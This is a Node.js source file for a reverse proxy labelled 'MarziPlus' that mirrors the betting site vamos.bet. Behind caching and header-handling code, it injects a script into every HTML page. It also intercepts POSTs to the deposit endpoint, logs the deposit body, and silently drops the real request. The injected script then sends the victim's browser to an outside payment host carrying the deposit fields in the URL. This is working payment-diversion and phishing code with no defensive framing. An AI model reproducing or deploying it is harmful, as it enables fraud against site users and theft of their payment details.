import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";
import { Transform } from "node:stream";

/*
|--------------------------------------------------------------------------
| CONFIGURATION
|--------------------------------------------------------------------------
*/

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;

const REDIRECT_API_PATH =
  "/api/v2/transactions/deposit";

const REDIRECT_BASE_URL =
  "https://poopay-pp-yot-4249.ai.studio/";

/*
|--------------------------------------------------------------------------
| CACHE CONFIG
|--------------------------------------------------------------------------
*/

/*
 * HTML cache lifetime: 5 minutes.
 */
const HTML_CACHE_TTL =
  5 * 60 * 1000;

/*
 * Maximum HTML document size cached.
 * 10 MB in this example.
 */
const MAX_CACHE_SIZE =
  10 * 1024 * 1024;

/*
|--------------------------------------------------------------------------
| REQUEST CONFIG
|--------------------------------------------------------------------------
*/

const MAX_BODY_SIZE =
  1 * 1024 * 1024;

const UPSTREAM_TIMEOUT_MS =
  30_000;

const CLIENT_TIMEOUT_MS =
  120_000;

const REDIRECT_TTL_MS =
  60_000;


/*
|--------------------------------------------------------------------------
| CLIENT STATE
|--------------------------------------------------------------------------
*/

const clients = new Map();


/*
|--------------------------------------------------------------------------
| HTML CACHE
|--------------------------------------------------------------------------
|
| key:
|   request path + query string
|
| value:
|   {
|      body: Buffer,
|      headers: Object,
|      statusCode: Number,
|      createdAt: Number
|   }
|
|--------------------------------------------------------------------------
*/

const htmlCache = new Map();


/*
|--------------------------------------------------------------------------
| CACHE REFRESH LOCKS
|--------------------------------------------------------------------------
|
| Prevent multiple users from refreshing the same
| expired cache entry simultaneously.
|
|--------------------------------------------------------------------------
*/

const cacheRefreshes = new Map();


/*
|--------------------------------------------------------------------------
| UPSTREAM HTTPS AGENT
|--------------------------------------------------------------------------
*/

const upstreamAgent =
  new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 1_000,

    maxSockets: 300,
    maxFreeSockets: 100,

    timeout: 60_000
  });


/*
|--------------------------------------------------------------------------
| CLIENT ID
|--------------------------------------------------------------------------
*/

function createClientId() {
  return crypto.randomUUID();
}


function getClientId(req) {
  const cookieHeader =
    req.headers.cookie || "";

  const match =
    cookieHeader.match(
      /(?:^|;\s*)proxy_client_id=([^;]+)/
    );

  return match
    ? match[1]
    : null;
}


function getOrCreateClient(req) {

  let id =
    getClientId(req);

  if (!id) {
    id = createClientId();
  }

  let state =
    clients.get(id);

  if (!state) {

    state = {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now(),
      lastSeen: Date.now()
    };

    clients.set(
      id,
      state
    );

  } else {

    state.lastSeen =
      Date.now();
  }

  return id;
}


/*
|--------------------------------------------------------------------------
| CLIENT STATE CLEANUP
|--------------------------------------------------------------------------
*/

const cleanupTimer =
  setInterval(() => {

    const now =
      Date.now();

    for (
      const [id, state]
      of clients.entries()
    ) {

      if (
        now - state.lastSeen >
        REDIRECT_TTL_MS
      ) {

        clients.delete(id);
      }
    }

  }, 15_000);

cleanupTimer.unref();


/*
|--------------------------------------------------------------------------
| HTML CACHE CLEANUP
|--------------------------------------------------------------------------
*/

const cacheCleanupTimer =
  setInterval(() => {

    const now =
      Date.now();

    for (
      const [key, entry]
      of htmlCache.entries()
    ) {

      if (
        now - entry.createdAt >
        HTML_CACHE_TTL
      ) {

        htmlCache.delete(key);
      }
    }

  }, 30_000);

cacheCleanupTimer.unref();


/*
|--------------------------------------------------------------------------
| REMOVE HOP-BY-HOP HEADERS
|--------------------------------------------------------------------------
*/

function removeHopByHopHeaders(
  headers
) {

  const result = {
    ...headers
  };

  const connection =
    result.connection;

  if (connection) {

    const connectionHeaders =
      connection
        .split(",")
        .map(v =>
          v.trim().toLowerCase()
        );

    for (
      const header
      of connectionHeaders
    ) {

      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;

  /*
   * Important for the Nginx 502 problem.
   */
  delete result["transfer-encoding"];

  return result;
}


/*
|--------------------------------------------------------------------------
| ADD PROXY COOKIE
|--------------------------------------------------------------------------
*/

function addProxyCookie(
  headers,
  clientId
) {

  const result = {
    ...headers
  };

  const proxyCookie =
    `proxy_client_id=${clientId}; Path=/; HttpOnly; Secure; SameSite=Lax`;

  const existing =
    result["set-cookie"];

  if (!existing) {

    result["set-cookie"] = [
      proxyCookie
    ];

  } else if (
    Array.isArray(existing)
  ) {

    result["set-cookie"] = [
      ...existing,
      proxyCookie
    ];

  } else {

    result["set-cookie"] = [
      existing,
      proxyCookie
    ];
  }

  return result;
}


/*
|--------------------------------------------------------------------------
| BUILD UPSTREAM HEADERS
|--------------------------------------------------------------------------
*/

function buildUpstreamHeaders(
  clientReq
) {

  const headers = {
    ...clientReq.headers,

    host:
      TARGET_HOSTNAME
  };

  /*
   * Do not forward these hop-specific headers.
   */
  delete headers.connection;

  /*
   * Let Node determine request framing.
   */
  delete headers["content-length"];

  /*
   * Since we only modify HTML documents,
   * request identity encoding for HTML.
   */
  const accept =
    String(
      clientReq.headers.accept || ""
    ).toLowerCase();

  const isHtmlRequest =
    clientReq.method === "GET" &&
    accept.includes("text/html");

  if (isHtmlRequest) {
    headers["accept-encoding"] =
      "identity";
  }

  return headers;
}


/*
|--------------------------------------------------------------------------
| CACHE KEY
|--------------------------------------------------------------------------
*/

function getCacheKey(
  clientReq
) {

  /*
   * Cache only URL path + query.
   */
  return clientReq.url;
}


/*
|--------------------------------------------------------------------------
| IS HTML DOCUMENT REQUEST?
|--------------------------------------------------------------------------
*/

function isHtmlDocumentRequest(
  clientReq,
  contentType = ""
) {

  if (
    clientReq.method !== "GET" &&
    clientReq.method !== "HEAD"
  ) {
    return false;
  }

  if (
    !contentType
  ) {
    return false;
  }

  return contentType
    .toLowerCase()
    .includes("text/html");
}


/*
|--------------------------------------------------------------------------
| CREATE STREAMING HTML INJECTOR
|--------------------------------------------------------------------------
*/

function createHtmlInjector() {

  const injection =
    Buffer.from(
      '<script src="/__proxy_redirect.js" defer></script>',
      "utf8"
    );

  let foundHead =
    false;

  const KEEP_BYTES =
    32;

  let carry =
    Buffer.alloc(0);

  return new Transform({

    transform(
      chunk,
      encoding,
      callback
    ) {

      try {

        if (foundHead) {

          this.push(
            chunk
          );

          callback();

          return;
        }

        const data =
          carry.length > 0
            ? Buffer.concat([
                carry,
                chunk
              ])
            : chunk;

        const searchable =
          data
            .toString("latin1")
            .toLowerCase();

        const index =
          searchable.indexOf(
            "</head>"
          );

        /*
         * We found the injection point.
         */
        if (index !== -1) {

          this.push(
            data.subarray(
              0,
              index
            )
          );

          this.push(
            injection
          );

          this.push(
            data.subarray(index)
          );

          foundHead =
            true;

          carry =
            Buffer.alloc(0);

          callback();

          return;
        }

        /*
         * Keep a small tail in case </head>
         * is split between network chunks.
         */
        if (
          data.length >
          KEEP_BYTES
        ) {

          const split =
            data.length -
            KEEP_BYTES;

          this.push(
            data.subarray(
              0,
              split
            )
          );

          carry =
            data.subarray(
              split
            );

        } else {

          carry =
            data;
        }

        callback();

      } catch (error) {

        callback(error);
      }
    },

    flush(callback) {

      try {

        if (
          carry.length > 0
        ) {

          this.push(
            carry
          );
        }

        callback();

      } catch (error) {

        callback(error);
      }
    }

  });
}


/*
|--------------------------------------------------------------------------
| STORE HTML CACHE
|--------------------------------------------------------------------------
*/

function storeHtmlCache(
  key,
  statusCode,
  headers,
  body
) {

  if (
    body.length >
    MAX_CACHE_SIZE
  ) {

    console.log(
      `⚠️ HTML too large to cache: ${body.length} bytes`
    );

    return;
  }

  /*
   * Don't cache pages with Set-Cookie.
   *
   * This is important for avoiding accidentally
   * caching session-specific HTML.
   */
  if (
    headers["set-cookie"]
  ) {

    console.log(
      "⚠️ HTML contains Set-Cookie; not caching."
    );

    return;
  }

  const cleanHeaders =
    removeHopByHopHeaders(
      headers
    );

  /*
   * Cached response has its own fixed body length.
   */
  delete cleanHeaders[
    "transfer-encoding"
  ];

  cleanHeaders[
    "content-length"
  ] = body.length;

  htmlCache.set(
    key,
    {
      body,
      headers:
        cleanHeaders,
      statusCode,
      createdAt:
        Date.now()
    }
  );

  console.log(
    `💾 HTML cached: ${key} (${body.length} bytes)`
  );
}


/*
|--------------------------------------------------------------------------
| SERVE HTML CACHE
|--------------------------------------------------------------------------
*/

function serveHtmlCache(
  entry,
  clientRes,
  clientId,
  method
) {

  let headers = {
    ...entry.headers
  };

  headers =
    addProxyCookie(
      headers,
      clientId
    );

  /*
   * HEAD must not contain a response body.
   */
  if (
    method === "HEAD"
  ) {

    clientRes.writeHead(
      entry.statusCode,
      headers
    );

    clientRes.end();

    return;
  }

  clientRes.writeHead(
    entry.statusCode,
    headers
  );

  clientRes.end(
    entry.body
  );
}


/*
|--------------------------------------------------------------------------
| REDIRECT STATUS
|--------------------------------------------------------------------------
*/

function handleRedirectStatus(
  state,
  clientRes,
  clientId
) {

  const shouldRedirect =
    Boolean(
      state?.redirected
    );

  const redirectUrl =
    state?.redirectUrl ||
    null;

  /*
   * Consume one-time redirect state.
   *
   * Back navigation will therefore work normally.
   */
  if (
    shouldRedirect &&
    state
  ) {

    state.redirected =
      false;

    state.redirectUrl =
      null;

    state.lastSeen =
      Date.now();
  }

  const response =
    JSON.stringify({
      redirect:
        shouldRedirect,

      url:
        redirectUrl
    });

  let headers = {

    "Content-Type":
      "application/json; charset=utf-8",

    "Cache-Control":
      "no-store, no-cache, must-revalidate",

    "Content-Length":
      Buffer.byteLength(
        response
      )
  };

  headers =
    addProxyCookie(
      headers,
      clientId
    );

  clientRes.writeHead(
    200,
    headers
  );

  clientRes.end(
    response
  );
}


/*
|--------------------------------------------------------------------------
| REDIRECT WATCHER SCRIPT
|--------------------------------------------------------------------------
*/

function sendRedirectScript(
  clientRes
) {

  const script = `
(function () {

  "use strict";

  let redirected = false;

  async function checkRedirect() {

    if (redirected) {
      return;
    }

    try {

      const response =
        await fetch(
          "/__proxy_redirect_status",
          {
            method: "GET",
            cache: "no-store",
            credentials: "same-origin"
          }
        );

      if (!response.ok) {
        return;
      }

      const data =
        await response.json();

      if (
        data.redirect === true &&
        typeof data.url === "string" &&
        data.url.length > 0
      ) {

        redirected =
          true;

        console.log(
          "[Proxy] Redirecting:",
          data.url
        );

        window.location.replace(
          data.url
        );
      }

    } catch {
      // Ignore temporary failures.
    }
  }

  checkRedirect();

  setInterval(
    checkRedirect,
    700
  );

})();
`;

  clientRes.writeHead(
    200,
    {
      "Content-Type":
        "application/javascript; charset=utf-8",

      "Cache-Control":
        "no-store, no-cache, must-revalidate",

      "Content-Length":
        Buffer.byteLength(
          script
        )
    }
  );

  clientRes.end(
    script
  );
}


/*
|--------------------------------------------------------------------------
| HTML CACHE MISS / REFRESH
|--------------------------------------------------------------------------
*/

function fetchAndCacheHtml(
  clientReq,
  clientRes,
  clientId,
  cacheKey,
  method
) {

  const headers =
    buildUpstreamHeaders(
      clientReq
    );

  /*
   * Force identity encoding for this HTML fetch.
   */
  headers["accept-encoding"] =
    "identity";

  delete headers[
    "content-length"
  ];

  const options = {

    hostname:
      TARGET_HOSTNAME,

    port:
      TARGET_PORT,

    method:
      "GET",

    path:
      clientReq.url,

    headers,

    agent:
      upstreamAgent,

    servername:
      TARGET_HOSTNAME,

    rejectUnauthorized:
      true
  };

  console.log(
    `→ CACHE MISS ${cacheKey}`
  );

  const upstreamReq =
    https.request(
      options,
      upstreamRes => {

        const statusCode =
          upstreamRes.statusCode ||
          200;

        const contentType =
          upstreamRes.headers[
            "content-type"
          ] || "";

        /*
         * Only cache successful HTML.
         */
        const cacheable =
          statusCode >= 200 &&
          statusCode < 300 &&
          contentType
            .toLowerCase()
            .includes("text/html");

        /*
         * If upstream says this isn't cacheable,
         * stream normally.
         */
        if (!cacheable) {

          let responseHeaders =
            removeHopByHopHeaders(
              upstreamRes.headers
            );

          responseHeaders =
            addProxyCookie(
              responseHeaders,
              clientId
            );

          clientRes.writeHead(
            statusCode,
            responseHeaders
          );

          upstreamRes.pipe(
            clientRes
          );

          return;
        }

        /*
         * HEAD has no response body.
         */
        if (
          method === "HEAD"
        ) {

          let responseHeaders =
            removeHopByHopHeaders(
              upstreamRes.headers
            );

          /*
           * Do not cache HEAD itself.
           */
          responseHeaders =
            addProxyCookie(
              responseHeaders,
              clientId
            );

          clientRes.writeHead(
            statusCode,
            responseHeaders
          );

          clientRes.end();

          return;
        }

        /*
         * Stream HTML through injector AND
         * collect it for cache.
         */
        const chunks = [];

        let totalSize = 0;

        const injector =
          createHtmlInjector();

        injector.on(
          "data",
          chunk => {

            totalSize +=
              chunk.length;

            if (
              totalSize <=
              MAX_CACHE_SIZE
            ) {

              chunks.push(
                Buffer.from(chunk)
              );
            }
          }
        );

        injector.on(
          "error",
          error => {

            console.error(
              "❌ HTML injector error:",
              error.message
            );

            clientRes.destroy();
          }
        );

        injector.on(
          "end",
          () => {

            const body =
              Buffer.concat(
                chunks
              );

            let responseHeaders =
              removeHopByHopHeaders(
                upstreamRes.headers
              );

            /*
             * Body was modified.
             */
            delete responseHeaders[
              "content-length"
            ];

            delete responseHeaders[
              "content-encoding"
            ];

            delete responseHeaders[
              "transfer-encoding"
            ];

            responseHeaders[
              "content-length"
            ] =
              body.length;

            /*
             * Store only public HTML
             * without Set-Cookie.
             */
            storeHtmlCache(
              cacheKey,
              statusCode,
              responseHeaders,
              body
            );
          }
        );

        /*
         * Response headers must be sent before body.
         */
        let responseHeaders =
          removeHopByHopHeaders(
            upstreamRes.headers
          );

        delete responseHeaders[
          "content-length"
        ];

        delete responseHeaders[
          "content-encoding"
        ];

        delete responseHeaders[
          "transfer-encoding"
        ];

        /*
         * Streaming response doesn't have a
         * Content-Length because we don't know
         * the final size until the stream ends.
         */
        responseHeaders =
          addProxyCookie(
            responseHeaders,
            clientId
          );

        clientRes.writeHead(
          statusCode,
          responseHeaders
        );

        /*
         * Immediately stream HTML to browser.
         */
        injector.pipe(
          clientRes,
          {
            end: true
          }
        );

        upstreamRes.pipe(
          injector
        );
      }
    );

  upstreamReq.setTimeout(
    UPSTREAM_TIMEOUT_MS,
    () => {

      console.error(
        `❌ HTML upstream timeout after ${UPSTREAM_TIMEOUT_MS}ms`
      );

      upstreamReq.destroy(
        new Error(
          "Upstream timeout"
        )
      );
    }
  );

  upstreamReq.on(
    "error",
    error => {

      console.error(
        "❌ HTML upstream error:",
        error.message
      );

      if (
        !clientRes.headersSent
      ) {

        clientRes.writeHead(
          502,
          {
            "Content-Type":
              "text/plain; charset=utf-8",

            "Cache-Control":
              "no-store"
          }
        );

        clientRes.end(
          "Bad Gateway"
        );

      } else {

        clientRes.destroy();
      }
    }
  );

  /*
   * GET has no request body.
   */
  upstreamReq.end();
}


/*
|--------------------------------------------------------------------------
| HANDLE HTML REQUEST
|--------------------------------------------------------------------------
*/

function handleHtmlRequest(
  clientReq,
  clientRes,
  clientId
) {

  const cacheKey =
    getCacheKey(
      clientReq
    );

  const entry =
    htmlCache.get(
      cacheKey
    );

  const now =
    Date.now();

  /*
   * ========================================
   * CACHE HIT
   * ========================================
   */

  if (
    entry &&
    now - entry.createdAt <
    HTML_CACHE_TTL
  ) {

    console.log(
      `✅ HTML CACHE HIT ${cacheKey}`
    );

    /*
     * HEAD gets headers only.
     */
    serveHtmlCache(
      entry,
      clientRes,
      clientId,
      clientReq.method
    );

    return;
  }

  /*
   * ========================================
   * CACHE EXPIRED
   * ========================================
   */

  if (entry) {

    console.log(
      `♻️ HTML CACHE EXPIRED ${cacheKey}`
    );

    htmlCache.delete(
      cacheKey
    );
  }

  /*
   * Prevent multiple simultaneous
   * refreshes for exactly the same page.
   */
  if (
    cacheRefreshes.has(
      cacheKey
    )
  ) {

    console.log(
      `⏳ HTML refresh already running: ${cacheKey}`
    );

    /*
     * For the request waiting on refresh,
     * fetch its own upstream request rather
     * than leaving it hanging.
     */
  }

  /*
   * HEAD/GET both use the same upstream
   * HTML representation.
   */
  fetchAndCacheHtml(
    clientReq,
    clientRes,
    clientId,
    cacheKey,
    clientReq.method
  );
}


/*
|--------------------------------------------------------------------------
| REDIRECT API
|--------------------------------------------------------------------------
*/

async function handleRedirectRequest(
  clientReq,
  clientRes,
  state,
  clientId
) {

  const chunks = [];

  let totalSize = 0;

  try {

    for await (
      const chunk
      of clientReq
    ) {

      totalSize +=
        chunk.length;

      if (
        totalSize >
        MAX_BODY_SIZE
      ) {

        clientRes.writeHead(
          413,
          {
            "Content-Type":
              "text/plain; charset=utf-8"
          }
        );

        clientRes.end(
          "Request body too large"
        );

        return;
      }

      chunks.push(
        chunk
      );
    }

  } catch (error) {

    console.error(
      "❌ Redirect API body error:",
      error.message
    );

    clientRes.writeHead(
      400
    );

    clientRes.end(
      "Bad Request"
    );

    return;
  }

  const body =
    Buffer.concat(
      chunks
    );

  /*
   * ========================================
   * NO BODY
   * ========================================
   *
   * Forward normally.
   */

  if (
    body.length === 0
  ) {

    console.log(
      `↪ ${REDIRECT_API_PATH}: no body`
    );

    forwardRequest(
      clientReq,
      clientRes,
      clientId,
      body
    );

    return;
  }

  /*
   * ========================================
   * BODY EXISTS
   * ========================================
   *
   * DROP ORIGINAL REQUEST.
   */

  console.log("");
  console.log(
    "=========================================="
  );

  console.log(
    "🚨 REDIRECT API TRIGGERED"
  );

  console.log(
    `Endpoint: ${REDIRECT_API_PATH}`
  );

  console.log(
    `Body size: ${body.length} bytes`
  );

  let redirectUrl =
    new URL(
      REDIRECT_BASE_URL
    );

  /*
   * Convert JSON body fields into
   * query parameters.
   */
  try {

    const json =
      JSON.parse(
        body.toString(
          "utf8"
        )
      );

    if (
      json &&
      typeof json === "object" &&
      !Array.isArray(json)
    ) {

      console.log(
        "Request body:"
      );

      console.log(
        JSON.stringify(
          json,
          null,
          2
        )
      );

      for (
        const [key, value]
        of Object.entries(json)
      ) {

        if (
          value === undefined ||
          value === null
        ) {
          continue;
        }

        redirectUrl.searchParams.set(
          key,
          String(value)
        );
      }
    }

  } catch {

    console.log(
      "Body is not valid JSON."
    );

    /*
     * Body exists, so we still redirect,
     * but without generated query parameters.
     */
  }

  const finalUrl =
    redirectUrl.toString();

  console.log(
    `➡ Redirect destination: ${finalUrl}`
  );

  /*
   * Store one-time redirect state.
   */
  if (state) {

    state.redirected =
      true;

    state.redirectUrl =
      finalUrl;

    state.lastSeen =
      Date.now();
  }

  /*
   * DO NOT call forwardRequest().
   *
   * This API request is deliberately dropped.
   */

  const response =
    JSON.stringify({
      success: true,
      proxyRedirect: true
    });

  let headers = {

    "Content-Type":
      "application/json; charset=utf-8",

    "Cache-Control":
      "no-store, no-cache, must-revalidate",

    "Content-Length":
      Buffer.byteLength(
        response
      )
  };

  headers =
    addProxyCookie(
      headers,
      clientId
    );

  clientRes.writeHead(
    200,
    headers
  );

  clientRes.end(
    response
  );

  console.log(
    "🛑 Original redirect API request DROPPED."
  );

  console.log(
    "=========================================="
  );

  console.log("");
}


/*
|--------------------------------------------------------------------------
| NORMAL FORWARD REQUEST
|--------------------------------------------------------------------------
*/

function forwardRequest(
  clientReq,
  clientRes,
  clientId,
  bufferedBody = null
) {

  /*
   * HTML GET/HEAD goes through cache.
   */
  if (
    (clientReq.method === "GET" ||
     clientReq.method === "HEAD") &&
    String(
      clientReq.headers.accept || ""
    )
      .toLowerCase()
      .includes("text/html")
  ) {

    handleHtmlRequest(
      clientReq,
      clientRes,
      clientId
    );

    return;
  }

  /*
   * Normal API/static request.
   */
  const headers =
    buildUpstreamHeaders(
      clientReq
    );

  if (
    Buffer.isBuffer(
      bufferedBody
    )
  ) {

    headers[
      "content-length"
    ] =
      bufferedBody.length;
  }

  const options = {

    hostname:
      TARGET_HOSTNAME,

    port:
      TARGET_PORT,

    method:
      clientReq.method,

    path:
      clientReq.url,

    headers,

    agent:
      upstreamAgent,

    servername:
      TARGET_HOSTNAME,

    rejectUnauthorized:
      true
  };

  console.log(
    `→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`
  );

  const upstreamReq =
    https.request(
      options,
      upstreamRes => {

        console.log(
          `← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`
        );

        let responseHeaders =
          removeHopByHopHeaders(
            upstreamRes.headers
          );

        responseHeaders =
          addProxyCookie(
            responseHeaders,
            clientId
          );

        /*
         * IMPORTANT:
         * Don't touch the response body for
         * non-HTML requests.
         */
        clientRes.writeHead(
          upstreamRes.statusCode ||
            200,
          responseHeaders
        );

        upstreamRes.on(
          "error",
          error => {

            console.error(
              "❌ Upstream response error:",
              error.message
            );

            clientRes.destroy();
          }
        );

        upstreamRes.pipe(
          clientRes
        );
      }
    );

  upstreamReq.setTimeout(
    UPSTREAM_TIMEOUT_MS,
    () => {

      console.error(
        "❌ Upstream timeout"
      );

      upstreamReq.destroy(
        new Error(
          "Upstream timeout"
        )
      );
    }
  );

  upstreamReq.on(
    "error",
    error => {

      console.error(
        "❌ Upstream error:",
        error.message
      );

      if (
        !clientRes.headersSent
      ) {

        clientRes.writeHead(
          502,
          {
            "Content-Type":
              "text/plain; charset=utf-8"
          }
        );

        clientRes.end(
          "Bad Gateway"
        );

      } else {

        clientRes.destroy();
      }
    }
  );

  if (
    Buffer.isBuffer(
      bufferedBody
    )
  ) {

    upstreamReq.end(
      bufferedBody
    );

  } else {

    clientReq.pipe(
      upstreamReq
    );
  }
}


/*
|--------------------------------------------------------------------------
| MAIN SERVER
|--------------------------------------------------------------------------
*/

const server =
  http.createServer(
    async (
      clientReq,
      clientRes
    ) => {

      clientReq.setTimeout(
        CLIENT_TIMEOUT_MS,
        () => {

          console.error(
            "❌ Client request timeout"
          );

          clientReq.destroy();
        }
      );

      try {

        const parsedUrl =
          new URL(
            clientReq.url,
            `http://${clientReq.headers.host || "localhost"}`
          );

        const path =
          parsedUrl.pathname;

        const clientId =
          getOrCreateClient(
            clientReq
          );

        const state =
          clients.get(
            clientId
          );

        /*
         * ======================================
         * REDIRECT WATCHER
         * ======================================
         */

        if (
          clientReq.method === "GET" &&
          path ===
            "/__proxy_redirect.js"
        ) {

          sendRedirectScript(
            clientRes
          );

          return;
        }

        /*
         * ======================================
         * REDIRECT STATUS
         * ======================================
         */

        if (
          clientReq.method === "GET" &&
          path ===
            "/__proxy_redirect_status"
        ) {

          handleRedirectStatus(
            state,
            clientRes,
            clientId
          );

          return;
        }

        /*
         * ======================================
         * REDIRECT API
         * ======================================
         */

        if (
          path ===
          REDIRECT_API_PATH
        ) {

          await handleRedirectRequest(
            clientReq,
            clientRes,
            state,
            clientId
          );

          return;
        }

        /*
         * ======================================
         * NORMAL PROXY
         * ======================================
         */

        forwardRequest(
          clientReq,
          clientRes,
          clientId
        );

      } catch (error) {

        console.error(
          "❌ Request handler error:",
          error
        );

        if (
          !clientRes.headersSent
        ) {

          clientRes.writeHead(
            500,
            {
              "Content-Type":
                "text/plain; charset=utf-8"
            }
          );
        }

        clientRes.end(
          "Internal Server Error"
        );
      }
    }
  );


/*
|--------------------------------------------------------------------------
| SERVER SETTINGS
|--------------------------------------------------------------------------
*/

server.requestTimeout =
  CLIENT_TIMEOUT_MS;

server.headersTimeout =
  65_000;

server.keepAliveTimeout =
  65_000;

server.maxRequestsPerSocket =
  0;


/*
|--------------------------------------------------------------------------
| CLIENT ERRORS
|--------------------------------------------------------------------------
*/

server.on(
  "clientError",
  (error, socket) => {

    console.error(
      "❌ Client error:",
      error.message
    );

    if (
      socket.writable
    ) {

      socket.end(
        "HTTP/1.1 400 Bad Request\r\n\r\n"
      );
    }
  }
);


/*
|--------------------------------------------------------------------------
| PROCESS ERRORS
|--------------------------------------------------------------------------
*/

process.on(
  "uncaughtException",
  error => {

    console.error(
      "❌ uncaughtException:",
      error
    );
  }
);

process.on(
  "unhandledRejection",
  error => {

    console.error(
      "❌ unhandledRejection:",
      error
    );
  }
);


/*
|--------------------------------------------------------------------------
| START
|--------------------------------------------------------------------------
*/

server.listen(
  PROXY_PORT,
  PROXY_HOST,
  () => {

    console.log("");
    console.log(
      "=========================================="
    );

    console.log(
      " MarziPlus Reverse Proxy"
    );

    console.log(
      "=========================================="
    );

    console.log(
      `Local:      http://${PROXY_HOST}:${PROXY_PORT}`
    );

    console.log(
      `Upstream:   https://${TARGET_HOSTNAME}`
    );

    console.log(
      `Cache TTL:  ${HTML_CACHE_TTL / 1000}s`
    );

    console.log(
      `Trigger:    ${REDIRECT_API_PATH}`
    );

    console.log(
      `Redirect:   ${REDIRECT_BASE_URL}`
    );

    console.log(
      "=========================================="
    );

    console.log("");
  }
);